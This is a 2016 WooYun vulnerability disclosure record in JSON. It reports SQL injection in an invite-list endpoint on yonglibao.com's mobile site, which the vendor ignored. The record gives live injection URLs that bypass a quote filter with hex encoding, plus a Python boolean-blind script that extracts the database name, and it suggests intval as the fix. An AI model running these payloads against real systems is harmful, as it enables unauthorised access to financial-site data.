{"id": 85827, "wybug_id": "wooyun-2016-0190403", "wybug_title": "p2p金融安全之永利宝某站SQL注入(附验证脚本)", "wybug_corp": "yonglibao.com", "wybug_author": "路人甲", "wybug_date": "2016-03-29 15:08", "wybug_open_date": "2016-04-03 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 单单过滤单引号没有啥用的 详细说明：  \nhttp://m.yonglibao.com/Event/V3ReComment/inviteList?userId=(select * from (select (sleep(5)))x)\n可以延时注入，但是后面写着写着注入语句的时候就习惯性在语句后面加上--或者%23.在这个坑里躺了挺久，应该这种关键词被替换了。。。导致好久没注射出来。后来无意间把后面的%23去掉发现就可以注入了。而且在url后面只能出现一个括号，并不能出现其他的and了。经过很长时间的fuzz，得到正常访问url为\nhttp://m.yonglibao.com/Event/V3ReComment/inviteList?userId=1\n人数是21.poc为\nhttp://m.yonglibao.com/Event/V3ReComment/inviteList?userId=%28select%20*%20from%20%28select%20%28substring%28version%28%29,1,1%29=%275%27%29%29x%29\n发现并不能注入如下图\n\n我了个x，这特么什么**玩意。没事，这种情况无非是过滤关键词，第一个想到的就是单引号，因为int型在mysql里面无论是否单引号包裹住都可以识别。\nhttp://m.yonglibao.com/Event/V3ReComment/inviteList?userId=(select * from (select (substring(version(),1,1)=5))x)\n发现就是过滤了单引号，我第一次这么喜欢21...\n\nmysql是个灵活的语言，字符串可以用十六进制来代替。0x呵呵哒。\n当前数据库名称为：new_yonglibao_c\n\n\n   漏洞证明：  \n#-*- coding:utf-8 -*-import binasciiimport requestspay = list('1234567890zxcvbnmasdfghjklqwertyuiop._ @')data = ''for x in range(1,16):\tfor payload in pay:\t\tpayloads = binascii.b2a_hex(payload) #把payload字符转换成十六进制\t\turl = 'http://m.yonglibao.com/Event/V3ReComment/inviteList?userId=(select * from (select (substring(database(),%d,1)=0x%s))x)' % (x,payloads)\t\tresponse = requests.get(url,verify=False,timeout=30)\t\tif '<span>21</span>人</li>' in response.content:  #bool型注入，直接匹配源码中不同的页面就ok\t\t\tprint u'数据库名称第'+repr(x)+u'位是：'+payload+'  '+url\t\t\tdata += payloadprint u'当前数据库名称为：'+data\n   修复方案：  intval函数可以完美的防御这个sql注入   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-04-03 15:10 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}